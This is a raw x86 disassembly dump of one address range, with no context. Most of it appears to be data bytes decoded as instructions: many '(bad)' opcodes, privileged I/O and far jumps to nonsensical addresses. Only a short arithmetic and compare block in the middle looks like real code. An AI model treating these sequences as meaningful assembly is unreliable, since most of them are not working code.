  40b287:	mov    DWORD PTR [ecx],ecx
  40b289:	imul   eax,DWORD PTR [ecx-0x77],0x6a
  40b28d:	push   ds
  40b28e:	ret    
  40b28f:	test   DWORD PTR es:[edi+edi*1-0x794e1833],0xdbf2d33e
  40b29b:	inc    ebp
  40b29c:	std    
  40b29d:	xchg   DWORD PTR [edi],esi
  40b29f:	cmp    DWORD PTR [ecx],ebx
  40b2a1:	shr    DWORD PTR [ebx-0x71],1
  40b2a4:	les    eax,FWORD PTR [ebx-0x2a1e0850]
  40b2aa:	jecxz  0x40b31b
  40b2ac:	int    0xc8
  40b2ae:	and    edi,eax
  40b2b0:	loopne 0x40b32c
  40b2b2:	xchg   esp,eax
  40b2b3:	jmp    0x40b322
  40b2b5:	xor    eax,0x6067b491
  40b2ba:	les    edi,FWORD PTR [ecx+0x3782f4a1]
  40b2c0:	dec    eax
  40b2c1:	mov    eax,ds:0xad4ccbb8
  40b2c6:	push   eax
  40b2c7:	cld    
  40b2c8:	stc    
  40b2c9:	das    
  40b2ca:	push   cs
  40b2cb:	sub    BYTE PTR [eax],0x1f
  40b2ce:	data16 or al,0xb9
  40b2d1:	test   al,0x1d
  40b2d3:	xchg   esp,eax
  40b2d4:	mov    ch,0xc6
  40b2d6:	and    ah,BYTE PTR [edi-0x24]
  40b2d9:	xchg   esp,eax
  40b2da:	jge    0x40b317
  40b2dc:	scas   eax,DWORD PTR es:[edi]
  40b2dd:	xor    DWORD PTR [edx+0x5c322438],ebp
  40b2e3:	(bad)  
  40b2e4:	iret   
  40b2e5:	push   eax
  40b2e6:	pop    eax
  40b2e7:	xor    DWORD PTR [edx+0x31],esi
  40b2ea:	cld    
  40b2eb:	mov    DWORD PTR ds:0x759b186d,edx
  40b2f1:	push   edi
  40b2f2:	xchg   BYTE PTR [esi],dh
  40b2f4:	les    ebp,FWORD PTR [ebp-0x7a]
  40b2f7:	data16 clc 
  40b2f9:	fcmovbe st,st(5)
  40b2fb:	test   eax,0x6ab5678a
  40b300:	loope  0x40b314
  40b302:	iret   
  40b303:	dec    eax
  40b304:	into   
  40b305:	jbe    0x40b2e8
  40b307:	push   ebp
  40b308:	xchg   esp,eax
  40b309:	push   edx
  40b30a:	push   ds
  40b30b:	xchg   ecx,eax
  40b30c:	lock cdq 
  40b30e:	loopne 0x40b34c
  40b310:	or     BYTE PTR [eiz*1+0x29d1642b],cl
  40b317:	mov    bl,0x8e
  40b319:	out    0xff,al
  40b31b:	aam    0x55
  40b31d:	pushf  
  40b31e:	into   
  40b31f:	inc    edx
  40b320:	add    esp,DWORD PTR [ebx+0x2f]
  40b323:	mov    eax,0x567b5149
  40b328:	ja     0x40b373
  40b32a:	retf   0xea26
  40b32d:	mov    esi,0x3632e013
  40b332:	jo     0x40b360
  40b334:	push   esi
  40b335:	cdq    
  40b336:	mov    cl,0x3
  40b338:	imul   edi
  40b33a:	aas    
  40b33b:	out    0x7d,eax
  40b33d:	div    BYTE PTR [ebx]
  40b33f:	(bad)  
  40b340:	js     0x40b365
  40b342:	xor    eax,0xd112ed2b
  40b347:	jnp    0x40b2fb
  40b349:	inc    ebx
  40b34a:	movaps xmm7,XMMWORD PTR [edx]
  40b34d:	and    esp,DWORD PTR [ecx]
  40b34f:	fist   WORD PTR [esi+0x3e8fe6d6]
  40b355:	adc    eax,0xbb85dd9a
  40b35a:	dec    esp
  40b35b:	and    BYTE PTR [edx],bh
  40b35d:	adc    DWORD PTR [ebx+ebp*2+0x6a],ecx
  40b361:	sub    al,0x60
  40b363:	shr    BYTE PTR [edi+0x1d],1
  40b366:	fisttp DWORD PTR [edx+0x27]
  40b369:	jbe    0x40b301
  40b36b:	add    dh,BYTE PTR [ecx+0x5689122a]
  40b371:	(bad)  
  40b372:	arpl   WORD PTR [ebx-0xc8c9f57],ax
  40b378:	jg     0x40b34c
  40b37a:	pop    edx
  40b37b:	es cmp al,0x7d
  40b37e:	mov    bl,0x9d
  40b380:	pushf  
  40b381:	or     DWORD PTR [edx],ebp
  40b383:	outs   dx,BYTE PTR ds:[esi]
  40b384:	call   0xf153:0x281b0d99
  40b38b:	lods   al,BYTE PTR ds:[esi]
  40b38c:	pop    esi
  40b38d:	jp     0x40b3db
  40b38f:	(bad)  
  40b390:	mov    ds:0x2be025c3,eax
  40b395:	sub    edi,ebp
  40b397:	sub    DWORD PTR [ebp-0x17],esp
  40b39a:	and    esi,DWORD PTR [edx-0x1664c765]
  40b3a0:	fs push 0x49
  40b3a3:	or     esp,DWORD PTR [edi+0x48f04f0]
  40b3a9:	das    
  40b3aa:	pop    esp
  40b3ab:	push   ds
  40b3ac:	dec    esp
  40b3ad:	std    
  40b3ae:	pushf  
  40b3af:	sbb    eax,DWORD PTR [ebx-0x6a]
  40b3b2:	mov    cl,0x65
  40b3b4:	inc    ebp
  40b3b5:	xchg   edx,eax
  40b3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3b7:	jg     0x40b42d
  40b3b9:	inc    ebx
  40b3ba:	call   0x7e65:0x1025e282
  40b3c1:	imul   ebx,DWORD PTR [esi],0x13d54dfd
  40b3c7:	call   0x36ca7457
  40b3cc:	xchg   edi,eax
  40b3cd:	dec    eax
  40b3ce:	inc    ebp
  40b3cf:	push   esp
  40b3d0:	xchg   ch,al
  40b3d2:	jl     0x40b405
  40b3d4:	std    
  40b3d5:	cli    
  40b3d6:	mov    edx,0x435c3bdb
  40b3db:	mov    ds:0xe0329168,al
  40b3e0:	and    al,0x3f
  40b3e2:	xchg   esi,eax
  40b3e3:	push   edi
  40b3e4:	jmp    DWORD PTR [ebx+0x27eadcf5]
  40b3ea:	sub    eax,0x74f27a22
  40b3ef:	adc    al,0x6f
  40b3f1:	dec    ebp
  40b3f2:	mov    ah,0x9b
  40b3f4:	leave  
  40b3f5:	pop    esp
  40b3f6:	push   esp
  40b3f7:	je     0x40b37c
  40b3f9:	rcr    ecx,cl
  40b3fb:	dec    esi
  40b3fc:	xor    esp,DWORD PTR [edx-0x68]
  40b3ff:	fwait
  40b400:	imul   BYTE PTR [ebx]
  40b402:	fistp  QWORD PTR [ebx]
  40b404:	fimul  DWORD PTR [edi]
  40b406:	xchg   DWORD PTR [edi],ebx
  40b408:	add    al,0x0
  40b40a:	add    BYTE PTR [ebx-0x58162bab],cl
  40b410:	or     BYTE PTR [eax],al
  40b412:	add    cl,ch
  40b414:	adc    al,BYTE PTR [eax+eax*1]
  40b417:	add    bl,dl
  40b419:	dec    edi
  40b41a:	int3   
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0xc8
  40b425:	jae    0x40b3c2
  40b427:	(bad)
  40b42b:	jle    0x40b49d
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b413
  40b431:	fisub  WORD PTR [ecx-0x35]
  40b434:	cli    
  40b435:	icebp  
  40b436:	shl    BYTE PTR [bp+di],cl
  40b439:	sub    DWORD PTR [ebx+0x7227ad88],ecx
  40b43f:	icebp  
  40b440:	add    eax,0x1f2360f1
  40b445:	shl    BYTE PTR ds:0x76f60a57,1
  40b44b:	mov    ds:0xdf7bce78,al
  40b450:	inc    edx
  40b451:	adc    eax,0xe6b6d333
  40b456:	imul   BYTE PTR [edx-0x24837b3b]
  40b45c:	and    DWORD PTR [edi+ecx*8+0x49],esp
  40b460:	xor    DWORD PTR [ebp-0x2dc70e75],edi
  40b466:	sub    dh,BYTE PTR [di]
  40b469:	stos   BYTE PTR es:[edi],al
  40b46a:	repz or edx,DWORD PTR [edi-0x4b1c6ee4]
  40b471:	aaa    
  40b472:	cld    
  40b473:	(bad)  
  40b474:	xchg   ebp,eax
  40b475:	(bad)  
  40b476:	jae    0x40b4d4
  40b478:	test   DWORD PTR [eax],0x15734943
  40b47e:	repz pop ebx
  40b480:	sub    al,0x85
  40b482:	aad    0xae
  40b484:	xor    al,0xdc
  40b486:	ret    0x9877
  40b489:	sbb    eax,0x62decde4
  40b48e:	jnp    0x40b499
  40b490:	test   DWORD PTR [ebp-0x15],edi
  40b493:	sbb    eax,0xc7177990
  40b498:	(bad)  
  40b49a:	shl    DWORD PTR [ebx],cl
  40b49c:	mov    ah,0xa9
  40b49e:	scas   eax,DWORD PTR es:[edi]
  40b49f:	lods   eax,DWORD PTR ds:[esi]
  40b4a0:	mov    ds:0x5c13c8a6,al
  40b4a5:	repz mul DWORD PTR [ecx+0x52]
  40b4a9:	jo     0x40b4a4
  40b4ab:	cmp    eax,0x75ae5ff1
  40b4b0:	xchg   edi,eax
  40b4b1:	arpl   WORD PTR [ecx-0x317503bc],si
  40b4b7:	adc    dh,0x9
  40b4ba:	xchg   DWORD PTR [esi],edi
  40b4bc:	shr    BYTE PTR [esi-0x73],cl
  40b4bf:	fwait
  40b4c0:	sbb    BYTE PTR [ecx+0x590c9558],bh
  40b4c6:	into   
  40b4c7:	aam    0xa4
  40b4c9:	addr16 dec edx
  40b4cb:	pushf  
  40b4cc:	sub    ah,dh
  40b4ce:	push   ds
  40b4cf:	div    DWORD PTR [esi]
  40b4d1:	mov    esi,DWORD PTR [eax+0x31]
  40b4d4:	hlt    
  40b4d5:	adc    BYTE PTR [eax-0x66150e01],0x97
  40b4dc:	add    al,0x3c
  40b4de:	fucomi st,st(7)
  40b4e0:	cmp    eax,0x70013fbd
  40b4e5:	mov    ah,0x13
  40b4e7:	pop    ebx
  40b4e8:	jecxz  0x40b4b0
  40b4ea:	add    BYTE PTR [edi],dl
  40b4ec:	push   eax
  40b4ed:	cld    
  40b4ee:	mov    ah,0xef
  40b4f0:	dec    ebp
  40b4f1:	adc    esi,DWORD PTR [ecx]
  40b4f3:	stc    
  40b4f4:	dec    edx
  40b4f5:	rol    BYTE PTR [edx-0x3463ac0],cl
  40b4fb:	scas   al,BYTE PTR es:[edi]
  40b4fc:	cmc    
  40b4fd:	dec    eax
  40b4fe:	xchg   edi,eax
  40b4ff:	xor    ch,bh
  40b501:	mov    dh,0xe1
  40b503:	xor    dh,al
  40b505:	pop    edx
  40b506:	xchg   BYTE PTR [ebx-0x37c837fd],cl
  40b50c:	cmp    al,0x1f
  40b50e:	adc    bh,BYTE PTR [ecx-0x4f302f01]
  40b514:	outs   dx,BYTE PTR ds:[esi]
  40b515:	mov    ecx,0x84753ecb
  40b51a:	jnp    0x40b511
  40b51c:	daa    
  40b51d:	pop    ss
  40b51e:	or     ebp,DWORD PTR [edi+0x503b860c]
  40b524:	jle    0x40b531
  40b526:	nop
  40b527:	mov    edi,0x7537e4bc
  40b52c:	lock mov eax,0x8b062581
  40b532:	(bad)  
  40b533:	arpl   ax,di
  40b535:	fs adc al,0xeb
  40b538:	cmp    esi,edx
  40b53a:	test   al,0xd
  40b53c:	jne    0x40b533
  40b53e:	test   eax,0xbc196e6
  40b543:	adc    eax,DWORD PTR [edx+0x792360fe]
  40b549:	(bad)  
  40b54a:	retf   0x2aa1
  40b54d:	repz xchg ecx,eax
  40b54f:	jecxz  0x40b50a
  40b551:	retf   0xf939
  40b554:	fimul  DWORD PTR [edi+0x4a]
  40b557:	push   ecx
  40b558:	not    DWORD PTR ds:0x2ca6aa4
  40b55e:	js     0x40b4ee
  40b560:	stc    
  40b561:	push   0x13
  40b563:	jbe    0x40b544
  40b565:	ret    
  40b566:	fist   DWORD PTR [eax]
  40b568:	outs   dx,DWORD PTR ds:[esi]
  40b569:	mov    es,WORD PTR [edx+0x5]
  40b56c:	and    cl,BYTE PTR [esi+0x6c]
  40b56f:	jmp    0xabd8707b
  40b574:	imul   ecx,DWORD PTR [esi+0x61],0x8409993d
  40b57b:	repnz push 0x3c1da3e7
  40b581:	dec    ecx
  40b582:	fst    DWORD PTR [ecx-0x350d64e6]
  40b588:	pushf  
  40b589:	sahf   
  40b58a:	gs std 
  40b58c:	and    eax,0xfbc50aea
  40b591:	pop    ds
  40b592:	lea    esp,[ebx-0x3f]
  40b595:	ror    DWORD PTR [esi-0x50aadba5],cl
  40b59b:	inc    ecx
  40b59c:	inc    ecx
  40b59d:	pop    esp
  40b59e:	clc    
  40b59f:	add    al,0x17
  40b5a1:	daa    
  40b5a2:	add    edx,0xffffff8c
  40b5a5:	jno    0x40b626
  40b5a7:	mov    DWORD PTR [ecx-0x4],ecx
  40b5aa:	xlat   BYTE PTR ds:[ebx]
  40b5ab:	push   esi
  40b5ac:	ficomp DWORD PTR [edi-0x7f]
  40b5af:	lock sub cl,BYTE PTR [eax-0x2a]
  40b5b3:	push   esp
  40b5b4:	or     edi,0xffffffee
  40b5b7:	dec    ecx
  40b5b8:	shr    DWORD PTR [ebx-0x5e4223f3],0x9e
  40b5bf:	out    0x35,eax
  40b5c1:	inc    ebx
  40b5c2:	repnz sbb ebp,0x9c8f651f
  40b5c9:	xchg   BYTE PTR [ebx],dl
  40b5cb:	or     eax,0x469e6275
  40b5d0:	xchg   DWORD PTR [edi+ebx*1-0x52],edx
  40b5d4:	cmp    eax,0xbb6da12f
  40b5d9:	loop   0x40b601
  40b5db:	dec    esi
  40b5dc:	aaa    
  40b5dd:	imul   edi,edi,0xb7584738
  40b5e3:	hlt    
  40b5e4:	inc    edx
  40b5e5:	(bad)  
  40b5e6:	std    
  40b5e7:	mov    ds:0x541ee4ec,al
  40b5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ed:	in     al,0x4a
  40b5ef:	(bad)  
  40b5f0:	lock dec ebx
  40b5f2:	xor    edx,esp
  40b5f4:	aas    
  40b5f5:	mov    ah,0x84
  40b5f7:	xchg   edi,eax
  40b5f8:	pop    ebx
  40b5f9:	mov    cl,0x3f
  40b5fb:	add    DWORD PTR [ecx+ebx*4-0x2f],0x3a
  40b600:	lock fsubrp st(6),st
  40b603:	inc    ebx
  40b604:	and    al,0xcf
  40b606:	mov    ds:0xc0a96e1f,al
  40b60b:	mov    ecx,0x37bfc61a
  40b610:	mov    dl,al
  40b612:	repnz ds pop ebx
  40b615:	jge    0x40b61b
  40b617:	cmp    DWORD PTR [edx+0x54],esi
  40b61a:	bound  edx,QWORD PTR [ebx+0x8bb65dc]
  40b620:	test   eax,0x81706573
  40b625:	mov    ds:0xb733d9a,al
  40b62a:	or     eax,0x7d1e55f8
  40b62f:	in     al,dx
  40b630:	push   esi
  40b631:	adc    esp,DWORD PTR [ebx+0x68785b6e]
  40b637:	movd   mm3,DWORD PTR [edi+0x29db9686]
  40b63e:	add    esp,DWORD PTR [edx]
  40b640:	push   ebp
  40b641:	fdivrp st(2),st
  40b643:	mov    ebp,0xb141cd6b
  40b648:	test   BYTE PTR [ecx+0x35],0xa3
  40b64c:	nop
  40b64d:	mov    DWORD PTR [edi+eiz*8-0x6a],esp
  40b651:	sbb    BYTE PTR [eax],bl
  40b653:	cmp    dh,al
  40b655:	sbb    eax,0x2763dd2e
  40b65a:	cmp    DWORD PTR [eax],edx
  40b65c:	dec    ebp
  40b65d:	cmc    
  40b65e:	pop    esp
  40b65f:	(bad)  
  40b660:	mov    al,ds:0x5a5092f4
  40b665:	add    edx,DWORD PTR [ecx+edi*8-0x10]
  40b669:	inc    ebx
  40b66a:	xrelease mov BYTE PTR [esi+0xb],dl
  40b66e:	mov    DWORD PTR [ebx+0x1f],esi
  40b671:	inc    esp
  40b672:	rol    DWORD PTR [ebx],cl
  40b674:	js     0x40b6cc
  40b676:	adc    eax,0x7e6b309e
  40b67b:	cmp    edx,ecx
  40b67d:	outs   dx,BYTE PTR ds:[esi]
  40b67e:	cmp    al,0x66
  40b680:	sbb    DWORD PTR [ecx-0x1f],edx
  40b683:	test   eax,0xc45baccc
  40b688:	mov    WORD PTR [edx],ss
  40b68a:	inc    ebx
  40b68b:	jl     0x40b6f5
  40b68d:	fisubr DWORD PTR [ecx]
  40b68f:	mov    eax,0x4981b801
  40b694:	adc    cl,BYTE PTR [eax-0x6817341c]
  40b69a:	mov    ah,0xfd
  40b69c:	lods   eax,DWORD PTR ds:[esi]
  40b69d:	aad    0x8c
  40b69f:	pop    es
  40b6a0:	popf   
  40b6a1:	push   ebx
  40b6a2:	sbb    ebx,ebp
  40b6a4:	or     al,0x91
  40b6a6:	test   DWORD PTR [eax+0x6a00cb94],ecx
  40b6ac:	cmp    BYTE PTR [ebp-0x9c150bb],dh
  40b6b2:	pop    es
  40b6b3:	jmp    0x5e09:0x13be2ae0
  40b6ba:	retf   
  40b6bb:	pop    esi
  40b6bc:	popf   
  40b6bd:	mov    ah,0x30
  40b6bf:	mov    edi,0x256c2d40
  40b6c4:	fs push edi
  40b6c6:	ret    0x3941
  40b6c9:	adc    al,0x4a
  40b6cb:	adc    al,0x62
  40b6cd:	adc    BYTE PTR [ecx-0x3443048b],ch
  40b6d3:	into   
  40b6d4:	mov    ah,0x70
  40b6d6:	push   ebx
  40b6d7:	cmp    bl,BYTE PTR [esi-0x46]
  40b6da:	xor    cx,sp
  40b6dd:	hlt    
  40b6de:	or     DWORD PTR [esi],eax
  40b6e0:	and    dh,bl
  40b6e2:	loop   0x40b68b
  40b6e4:	dec    ebx
  40b6e5:	cld    
  40b6e6:	mov    esi,0x2499ee68
  40b6eb:	xchg   ebx,eax
  40b6ec:	cmp    eax,0xf1a86e29
  40b6f1:	fstp   DWORD PTR [edx+0x5fbcd947]
  40b6f7:	xchg   BYTE PTR [ecx],bl
  40b6f9:	cmp    al,0x21
  40b6fb:	dec    edi
  40b6fc:	pop    esp
  40b6fd:	fisubr DWORD PTR [esi-0x2a6d8cd3]
  40b703:	cmp    DWORD PTR [eax],0xffffffee
  40b706:	outs   dx,DWORD PTR ds:[esi]
  40b707:	cli    
  40b708:	sub    cl,bl
  40b70a:	clc    
  40b70b:	jne    0x40b6c3
  40b70d:	cdq    
  40b70e:	push   0x64
  40b710:	cmc    
  40b711:	sbb    BYTE PTR ss:[esi+0x62cd8cbb],bh
  40b718:	push   DWORD PTR [esi+0x1198a3ca]
  40b71e:	pop    es
  40b71f:	mov    cl,0x64
  40b721:	mov    dh,0xc4
  40b723:	push   ecx
  40b724:	or     DWORD PTR [ebx+0x0],ecx
  40b727:	cmp    eax,0x3e92d043
  40b72c:	dec    eax
  40b72d:	adc    ebp,DWORD PTR [eax+ebp*2+0x4b9b7ec8]
  40b734:	jno    0x40b6d2
  40b736:	add    DWORD PTR [ebx-0x13],esi
  40b739:	mov    al,0xfd
  40b73b:	aas    
  40b73c:	inc    ecx
  40b73d:	test   BYTE PTR ds:0x2a3c1b7a,al
  40b743:	jl     0x40b778
  40b745:	xchg   DWORD PTR [edx],esi
  40b747:	mov    al,ds:0xcea946a0
  40b74c:	inc    ecx
  40b74d:	xchg   ebp,eax
  40b74e:	aad    0xe8
  40b750:	daa    
  40b751:	fnsave [esi]
  40b753:	pop    eax
  40b754:	cmc    
  40b755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b756:	js     0x40b788
  40b758:	(bad)
  40b75b:	stc    
  40b75c:	test   edi,edi
  40b75e:	leave  
  40b75f:	loopne 0x40b79e
  40b761:	ret    0x7b72
  40b764:	pop    ss
  40b765:	mov    ebx,0x77aeaaae
  40b76a:	(bad)  
  40b76c:	mov    bh,BYTE PTR [edi-0x69]
  40b76f:	mov    ebp,0xb3a8768f
  40b774:	inc    ecx
  40b775:	xbegin 0x8ce0947a
  40b77b:	(bad)  
  40b77c:	push   edx
  40b77d:	mov    dl,0x54
  40b77f:	pop    eax
  40b780:	mov    edx,DWORD PTR [edi-0x34fa4179]
  40b786:	sub    edi,DWORD PTR ds:0x9b8c566a
  40b78c:	cli    
  40b78d:	scas   al,BYTE PTR es:[edi]
  40b78e:	xchg   ecx,eax
  40b78f:	mov    edi,0xa39f01f0
  40b794:	(bad)  
  40b796:	je     0x40b774
  40b798:	nop
  40b799:	cmp    DWORD PTR [ebp+0x3d7ce0a2],ecx
  40b79f:	aas    
  40b7a0:	ds int 0x7b
  40b7a3:	jbe    0x40b79e
  40b7a5:	call   0xe8c7:0x5b4cb21e
  40b7ac:	sahf   
  40b7ad:	es jmp 0xee2417a4
  40b7b3:	and    edx,0x44
  40b7b6:	jb     0x40b7d5
  40b7b8:	and    ebx,DWORD PTR [esi+ebx*2-0x4a]
  40b7bc:	or     DWORD PTR [esi],esp
  40b7be:	and    DWORD PTR [edi-0x50],0x96e68df5
  40b7c5:	cmp    DWORD PTR [ebx-0x15],esp
  40b7c8:	arpl   sp,sp
  40b7ca:	dec    ebp
  40b7cb:	ins    BYTE PTR es:[edi],dx
  40b7cc:	or     BYTE PTR [eax-0x5d],ah
  40b7cf:	ficomp WORD PTR [ebp+0x5eefe0c5]
  40b7d5:	daa    
  40b7d6:	mov    bh,0x18
  40b7d8:	mov    dh,0xa4
  40b7da:	sub    eax,0xbfee2e1f
  40b7df:	fisttp DWORD PTR [ebx-0x45]
  40b7e2:	sbb    ch,BYTE PTR [ebx-0x54]
  40b7e5:	inc    ebx
  40b7e6:	and    eax,DWORD PTR [edi-0x22]
  40b7e9:	push   ecx
  40b7ea:	(bad)  
  40b7eb:	repnz push ebp
  40b7ed:	mov    ebp,0xb83cdc42
  40b7f2:	test   eax,0xde214846
  40b7f7:	sahf   
  40b7f8:	outs   dx,DWORD PTR ds:[esi]
  40b7f9:	fbstp  TBYTE PTR [edi]
  40b7fb:	lods   al,BYTE PTR ds:[esi]
  40b7fc:	cdq    
  40b7fd:	jbe    0x40b7cc
  40b7ff:	add    DWORD PTR [edi],ebx
  40b801:	je     0x40b858
  40b803:	add    BYTE PTR [edx],dl
  40b805:	mov    WORD PTR [esi],es
  40b807:	inc    eax
  40b808:	arpl   WORD PTR [edx+0x7e],bp
  40b80b:	repnz xor al,0x61
  40b80e:	iret   
  40b80f:	lods   eax,DWORD PTR ds:[esi]
  40b810:	sbb    cl,al
  40b812:	outs   dx,BYTE PTR ds:[esi]
  40b813:	int    0x76
  40b815:	inc    ebx
  40b816:	xchg   ebp,eax
  40b817:	push   esi
  40b818:	es jmp 0x1949:0x54dc9c84
  40b820:	add    BYTE PTR [ecx+0x53ada659],bh
  40b826:	jno    0x40b867
  40b828:	adc    al,BYTE PTR [ebp-0x75]
  40b82b:	push   ebp
  40b82c:	int3   
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	dec    edx
  40b8a5:	loope  0x40b88c
  40b8a7:	arpl   dx,sp
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b843
  40b8b1:	mov    esi,0xe18a443
  40b8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8b7:	or     eax,0x5cd2b582
  40b8bc:	inc    esp
  40b8bd:	adc    ebx,DWORD PTR [edi-0x5d2c470a]
  40b8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8c4:	mov    dl,0xd0
  40b8c6:	pop    edi
  40b8c7:	mov    eax,0xcb2454da
  40b8cc:	push   ds
  40b8cd:	hlt    
  40b8ce:	xor    BYTE PTR [ecx],dl
  40b8d0:	pop    esp
  40b8d1:	xchg   bh,ch
  40b8d3:	cmp    esp,ebx
  40b8d5:	xor    edx,DWORD PTR [ecx-0x747dbef4]
  40b8db:	ins    BYTE PTR es:[edi],dx
  40b8dc:	push   0x2f6e275
  40b8e1:	stos   DWORD PTR es:[edi],eax
  40b8e2:	jbe    0x40b88e
  40b8e4:	pop    es
  40b8e5:	mov    cl,0x7a
  40b8e7:	adc    al,0x3b
  40b8e9:	add    al,0xbc
  40b8eb:	or     ah,cl
  40b8ed:	outs   dx,BYTE PTR ds:[esi]
  40b8ee:	mov    ecx,0xe5756523
  40b8f3:	out    dx,al
  40b8f4:	sbb    esp,DWORD PTR [edx]
  40b8f6:	xchg   edi,eax
  40b8f7:	mov    eax,ds:0xb8ad23ad
  40b8fc:	dec    esi
  40b8fd:	(bad)  [eax+edi*8-0x6d5290a3]
  40b904:	pop    es
  40b905:	pop    es
  40b906:	add    eax,0x492206ef
  40b90b:	xchg   edi,eax
  40b90c:	push   0x53
  40b90e:	ss mov esi,0xc757ccfd
  40b914:	das    
  40b915:	maskmovq mm4,(bad)
  40b916:	mul    DWORD PTR [ebx+edx*2]
  40b919:	or     DWORD PTR [ebx+ebx*8+0x126b97a4],ebx
  40b920:	push   cs
  40b921:	adc    BYTE PTR ds:0x5ae285ad,bl
  40b927:	dec    esp
  40b928:	jle    0x40b8f5
  40b92a:	in     eax,0x57
  40b92c:	rol    cl,0x29
  40b92f:	jge    0x40b91a
  40b931:	lods   eax,DWORD PTR ds:[esi]
  40b932:	sbb    BYTE PTR [edi+0x5],0x73
  40b936:	and    al,0x80
  40b938:	cli    
  40b939:	sub    ebp,edx
  40b93b:	std    
  40b93c:	mov    dl,0x14
  40b93e:	iret   
  40b93f:	push   ds
  40b940:	sti    
  40b941:	popa   
  40b942:	adc    DWORD PTR [edx-0x5],ebp
  40b945:	dec    edi
  40b946:	repnz pop ecx
  40b948:	push   edi
  40b949:	je     0x40b906
  40b94b:	sbb    al,0xc
  40b94d:	xchg   esi,eax
  40b94e:	and    BYTE PTR [eax],al
  40b950:	sbb    bl,cl
  40b952:	xchg   ebp,eax
  40b953:	(bad)  
  40b955:	mov    dl,dh
  40b957:	daa    
  40b958:	mov    esi,0xaaebc7ac
  40b95d:	je     0x40b965
  40b95f:	rcr    BYTE PTR [ebx+0x37],1
  40b962:	mov    ecx,0x334c4636
  40b967:	pop    ss
  40b968:	fldcw  WORD PTR [ebp+0x24eb6e78]
  40b96e:	jle    0x40b9e9
  40b970:	jle    0x40b9a9
  40b972:	imul   ebp,DWORD PTR [ebx+edi*2],0x83044de9
  40b979:	dec    ebx
  40b97a:	lods   eax,DWORD PTR ds:[esi]
  40b97b:	cmp    al,0xb1
  40b97d:	arpl   WORD PTR [esp+ebx*2+0x31],cx
  40b981:	sti    
  40b982:	adc    al,0xb2
  40b984:	xchg   edi,eax
  40b985:	aad    0xcc
  40b987:	sbb    ecx,eax
  40b989:	retf   0x79aa
  40b98c:	pop    edi
  40b98d:	jge    0x40b98e
  40b98f:	loopne 0x40b98d
  40b991:	add    ecx,ebx
  40b993:	xchg   edi,eax
  40b994:	jns    0x40b99d
  40b996:	sub    esi,DWORD PTR [ebp+edx*1-0x7e]
  40b99a:	mov    ah,0x26
  40b99c:	add    dl,ah
  40b99e:	inc    ebx
  40b99f:	pop    esp
  40b9a0:	cmp    bl,BYTE PTR [esi+0x6dcdacc1]
  40b9a6:	xchg   DWORD PTR [ebx-0x1a1797ff],ebp
  40b9ac:	sub    eax,0xe3568615
  40b9b1:	gs xor al,0x6b
  40b9b4:	jl     0x40ba12
  40b9b6:	pop    ebx
  40b9b7:	xchg   BYTE PTR [edx],ah
  40b9b9:	lock jmp 0xd06b:0xa8069e05
  40b9c1:	push   ecx
  40b9c2:	xor    al,0x39
  40b9c4:	bound  eax,QWORD PTR [edi]
  40b9c6:	lea    esi,[ebx-0x74449852]
  40b9cc:	ss inc edx
  40b9ce:	sbb    ch,ch
  40b9d0:	adc    DWORD PTR [esi+0xc],esi
  40b9d3:	cs stos DWORD PTR es:[edi],eax
  40b9d5:	(bad)  [eax+0x59ef32c0]
  40b9db:	leave  
  40b9dc:	sub    eax,0xfd719cd2
  40b9e1:	mov    fs,WORD PTR [ecx-0x7f3bf930]
  40b9e7:	in     al,0x76
  40b9e9:	retf   
  40b9ea:	sub    al,0x71
  40b9ec:	loop   0x40ba4e
  40b9ee:	div    DWORD PTR [ecx-0x114d9a62]
  40b9f4:	mov    dh,0xf8
  40b9f6:	repnz add eax,0x650862bc
  40b9fc:	loope  0x40ba30
  40b9fe:	or     al,0x2a
  40ba00:	fstp   TBYTE PTR [ecx+edi*4]
  40ba03:	mov    ds:0xe45e9e9b,eax
  40ba08:	scas   eax,DWORD PTR es:[edi]
  40ba09:	cs mov al,ah
  40ba0c:	cmp    DWORD PTR [edi+0x1b],ecx
  40ba0f:	sahf   
  40ba10:	ins    DWORD PTR es:[edi],dx
